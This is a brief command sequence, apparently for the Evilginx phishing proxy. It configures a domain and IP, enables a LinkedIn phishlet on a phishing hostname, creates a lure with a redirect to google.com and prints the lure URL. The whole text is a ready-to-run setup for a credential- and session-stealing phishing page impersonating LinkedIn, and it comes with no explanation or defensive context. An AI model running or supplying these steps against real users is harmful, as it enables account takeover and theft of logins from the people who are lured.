config domain testphp.vulnweb.com
config ip 44.228.249.3

phishlets hostname linkedin my.phishing.hostname.testphp.vulnweb.com
phishlets enable linkedin

lures create linkedin
lures edit 0 redirect_url https://www.google.com
lures get-url 0
